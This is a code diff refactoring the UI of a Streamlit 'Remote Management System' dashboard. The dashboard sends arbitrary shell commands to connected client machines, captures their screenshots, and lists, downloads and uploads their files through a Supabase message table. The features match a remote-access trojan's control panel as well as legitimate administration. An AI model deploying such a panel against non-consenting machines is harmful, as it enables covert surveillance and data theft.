@@ -111,27 +111,27 @@ def load_lottieurl(url: str):
 
 # --- Dashboard Functions for a Selected Client ---
 def show_command_center(selected_client):
-    st.header("Command Center")
+    st.subheader("Command Center")
     with st.form("command_form"):
         command = st.text_input("Enter Command", placeholder="Type your command here")
         if st.form_submit_button("Execute"):
             if command:
                 if send_command(selected_client, f"cmd {command}"):
                     st.success("Command sent successfully!")
-
+                    
 def show_screenshot(selected_client):
-    st.header("Screenshot")
+    st.subheader("Screenshot")
     if st.button("Capture Screenshot"):
         if send_command(selected_client, "get image"):
             st.success("Screenshot request sent!")
             time.sleep(2)
-
+            
 def show_file_manager(selected_client):
-    st.header("File Manager")
+    st.subheader("File Manager")
     fm_tabs = st.tabs(["List Files", "Download File", "Upload File"])
     
     with fm_tabs[0]:
-        st.subheader("List Files")
+        st.caption("List Files")
         directory = st.text_input("Directory", value=".")
         if st.button("List Files"):
             command = f"file list {directory}"
@@ -139,7 +139,7 @@ def show_file_manager(selected_client):
                 st.success("List Files command sent!")
     
     with fm_tabs[1]:
-        st.subheader("Download File")
+        st.caption("Download File")
         filepath = st.text_input("File path to download")
         if st.button("Download File"):
             command = f"file get {filepath}"
@@ -147,7 +147,7 @@ def show_file_manager(selected_client):
                 st.success("Download command sent! Check Message History for file data.")
     
     with fm_tabs[2]:
-        st.subheader("Upload File")
+        st.caption("Upload File")
         uploaded_file = st.file_uploader("Choose a file to upload")
         destination = st.text_input("Destination path on client", value="C:/destination/")
         if st.button("Upload File"):
@@ -165,7 +165,7 @@ def show_file_manager(selected_client):
                 st.error("Please select a file and specify a destination.")
 
 def show_message_history(selected_client):
-    st.header("Message History")
+    st.subheader("Message History")
     if st.button("Refresh Messages"):
         messages = supabase.table('messages')\
             .select('*')\
@@ -196,18 +196,6 @@ def show_message_history(selected_client):
                         st.error(f"Error processing file message: {e}")
                 st.text(f"Status: {msg['status']}")
 
-def show_client_dashboard(selected_client):
-    st.markdown(f"<div class='header-title'>Dashboard for Client: {selected_client}</div>", unsafe_allow_html=True)
-    tabs = st.tabs(["Command", "Screenshot", "Files", "History"])
-    with tabs[0]:
-        show_command_center(selected_client)
-    with tabs[1]:
-        show_screenshot(selected_client)
-    with tabs[2]:
-        show_file_manager(selected_client)
-    with tabs[3]:
-        show_message_history(selected_client)
-
 # --- Home Screen: Show All Clients as Clickable Cards ---
 def show_home():
     st.markdown("<div class='header-title'>Remote Management System</div>", unsafe_allow_html=True)
@@ -223,26 +211,26 @@ def show_home():
         st.warning("No clients connected")
         return
 
-    # Use columns to layout client cards (adjust number of columns as needed)
+    # Use columns to layout client cards
     cols = st.columns(3)
     for idx, c in enumerate(clients.data):
         status = get_client_status(c['last_seen'])
         card_html = f"""
-        <div class="client-card" id="{c['client_id']}" style="padding: 20px;">
+        <div class="client-card">
             <h3>{c['hostname']}</h3>
             <p><strong>ID:</strong> {c['client_id']}</p>
             <p><strong>OS:</strong> {c['os']}</p>
             <p><strong>IP:</strong> {c['ip_address']}</p>
             <p><strong>Status:</strong> <span class="status-{status}">{status.upper()}</span></p>
             <p><strong>Last Seen:</strong> {c['last_seen']}</p>
-        </div>"""
-        # Use a button for each card. When clicked, store selected client in session_state.
-        if cols[idx % 3].markdown(card_html, unsafe_allow_html=True):
-            pass
-        # Because st.markdown is not clickable by default, we add a button below each card.
-        if cols[idx % 3].button("Manage", key=c['client_id']):
-            st.session_state["selected_client"] = c['client_id']
-            
+        </div>
+        """
+        # Render the card and add a "Manage" button
+        with cols[idx % 3]:
+            st.markdown(card_html, unsafe_allow_html=True)
+            if st.button("Manage", key=c['client_id']):
+                st.session_state["selected_client"] = c['client_id']
+                # Do not rerun explicitly; Streamlit will re-run on state change.
 
     # Optionally display a Lottie animation on the home screen
     lottie_animation = load_lottieurl("https://assets3.lottiefiles.com/packages/lf20_yp2m9iwx.json")
@@ -253,11 +241,31 @@ def show_home():
 if "selected_client" not in st.session_state:
     st.session_state["selected_client"] = None
 
-# Sidebar Navigation using On Hover Tabs (when a client is selected)
-with st.sidebar:
-    tabs = on_hover_tabs(
-        tabName=['Home', 'Dashboard'],
-        iconName=['home', 'dashboard'],
+# If no client has been selected, show the home screen
+if st.session_state["selected_client"] is None:
+    show_home()
+else:
+    # Sidebar: Always allow changing the client via a select box
+    clients = supabase.table('clients')\
+            .select('*')\
+            .order('last_seen', desc=True)\
+            .execute()
+    if clients.data:
+        client_options = {c['client_id']: f"{c['hostname']} ({c['client_id']})" for c in clients.data}
+        selected_client = st.sidebar.selectbox(
+            "Select Client", options=list(client_options.keys()),
+            format_func=lambda x: client_options[x],
+            index=list(client_options.keys()).index(st.session_state["selected_client"])
+        )
+        st.session_state["selected_client"] = selected_client
+    else:
+        st.warning("No clients connected")
+        st.stop()
+
+    # Sidebar Navigation using On Hover Tabs for command functions
+    sidebar_tabs = on_hover_tabs(
+        tabName=['Command', 'Screenshot', 'Files', 'History'],
+        iconName=['terminal', 'camera', 'folder', 'clock'],
         default_choice=0,
         styles={
             'navtab': {
@@ -272,15 +280,16 @@ with st.sidebar:
             'iconStyle': {'position': 'fixed', 'left': '7.5px', 'text-align': 'left'},
             'tabStyle': {'list-style-type': 'none', 'margin-bottom': '30px', 'padding-left': '30px'}
         },
-        key="main_nav"
+        key="sidebar_nav"
     )
 
-# Main UI Routing
-if tabs == "Home" or st.session_state["selected_client"] is None:
-    # Show the home screen with the list of clients
-    show_home()
-else:
-    # A client has been selected. Show a "Back" button to return to the home screen.
-    st.sidebar.button("Back to Home", key="back", on_click=lambda: st.session_state.update({"selected_client": None}))
-    # Show dashboard for the selected client
-    show_client_dashboard(st.session_state["selected_client"])
+    # Main Area: Show the selected command function
+    st.markdown(f"<div class='header-title'>Dashboard for Client: {st.session_state['selected_client']}</div>", unsafe_allow_html=True)
+    if sidebar_tabs == "Command":
+        show_command_center(st.session_state["selected_client"])
+    elif sidebar_tabs == "Screenshot":
+        show_screenshot(st.session_state["selected_client"])
+    elif sidebar_tabs == "Files":
+        show_file_manager(st.session_state["selected_client"])
+    elif sidebar_tabs == "History":
+        show_message_history(st.session_state["selected_client"])
